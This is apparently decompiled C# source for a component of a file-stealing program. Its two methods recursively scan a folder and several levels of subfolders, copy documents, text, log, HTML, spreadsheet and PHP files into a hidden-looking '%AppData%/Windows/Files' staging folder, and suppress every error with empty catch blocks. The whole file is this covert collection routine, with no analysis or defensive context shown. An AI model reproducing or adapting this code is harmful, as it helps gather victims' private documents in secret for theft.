using System;
using System.IO;

namespace d3sktop
{
	// Token: 0x0200000D RID: 13
	internal class desktop
	{
		// Token: 0x0600001A RID: 26 RVA: 0x000035A0 File Offset: 0x000017A0
		public static void desktop_text(string path)
		{
			try
			{
				bool flag = Directory.Exists(path);
				if (flag)
				{
					string[] files = Directory.GetFiles(path);
					Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Files");
					for (int i = 0; i < files.Length; i++)
					{
						FileInfo fileInfo = new FileInfo(files[i]);
						bool flag2 = fileInfo.Extension == ".doc" || fileInfo.Extension == ".txt" || fileInfo.Extension == ".text" || fileInfo.Extension == ".log" || fileInfo.Extension == ".html" || fileInfo.Extension == ".htm" || fileInfo.Extension == ".xls";
						if (flag2)
						{
							fileInfo.CopyTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Files/" + fileInfo.Name);
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000036C0 File Offset: 0x000018C0
		public static void dekstop_dir(string path)
		{
			try
			{
				string[] directories = Directory.GetDirectories(path);
				for (int i = 0; i < directories.Length; i++)
				{
					string[] directories2 = Directory.GetDirectories(directories[i]);
					bool flag = Directory.Exists(directories[i]);
					if (flag)
					{
						string[] files = Directory.GetFiles(directories[i]);
						for (int j = 0; j < files.Length; j++)
						{
							FileInfo fileInfo = new FileInfo(files[j]);
							bool flag2 = fileInfo.Extension == ".doc" || fileInfo.Extension == ".txt" || fileInfo.Extension == ".text" || fileInfo.Extension == ".log" || fileInfo.Extension == ".html" || fileInfo.Extension == ".htm" || fileInfo.Extension == ".xls" || fileInfo.Extension == ".docx" || fileInfo.Extension == ".php";
							if (flag2)
							{
								fileInfo.CopyTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Files/" + fileInfo.Name);
							}
						}
					}
					for (int k = 0; k < directories2.Length; k++)
					{
						string[] directories3 = Directory.GetDirectories(directories2[k]);
						bool flag3 = Directory.Exists(directories2[k]);
						if (flag3)
						{
							string[] files2 = Directory.GetFiles(directories2[k]);
							for (int l = 0; l < files2.Length; l++)
							{
								FileInfo fileInfo2 = new FileInfo(files2[l]);
								bool flag4 = fileInfo2.Extension == ".doc" || fileInfo2.Extension == ".txt" || fileInfo2.Extension == ".text" || fileInfo2.Extension == ".log" || fileInfo2.Extension == ".html" || fileInfo2.Extension == ".htm" || fileInfo2.Extension == ".xls";
								if (flag4)
								{
									fileInfo2.CopyTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Files/" + fileInfo2.Name);
								}
							}
						}
						for (int m = 0; m < directories3.Length; m++)
						{
							string[] directories4 = Directory.GetDirectories(directories3[m]);
							bool flag5 = Directory.Exists(directories3[m]);
							if (flag5)
							{
								string[] files3 = Directory.GetFiles(directories3[m]);
								for (int n = 0; n < files3.Length; n++)
								{
									FileInfo fileInfo3 = new FileInfo(files3[n]);
									bool flag6 = fileInfo3.Extension == ".doc" || fileInfo3.Extension == ".txt" || fileInfo3.Extension == ".text" || fileInfo3.Extension == ".log" || fileInfo3.Extension == ".html" || fileInfo3.Extension == ".htm" || fileInfo3.Extension == ".xls";
									if (flag6)
									{
										fileInfo3.CopyTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Files/" + fileInfo3.Name);
									}
								}
							}
							for (int num = 0; num < directories4.Length; num++)
							{
								string[] directories5 = Directory.GetDirectories(directories4[num]);
								bool flag7 = Directory.Exists(directories4[num]);
								if (flag7)
								{
									string[] files4 = Directory.GetFiles(directories4[num]);
									for (int num2 = 0; num2 < files4.Length; num2++)
									{
										FileInfo fileInfo4 = new FileInfo(files4[num2]);
										bool flag8 = fileInfo4.Extension == ".doc" || fileInfo4.Extension == ".txt" || fileInfo4.Extension == ".text" || fileInfo4.Extension == ".log" || fileInfo4.Extension == ".html" || fileInfo4.Extension == ".htm" || fileInfo4.Extension == ".xls";
										if (flag8)
										{
											fileInfo4.CopyTo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows/Files/" + fileInfo4.Name);
										}
									}
								}
							}
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
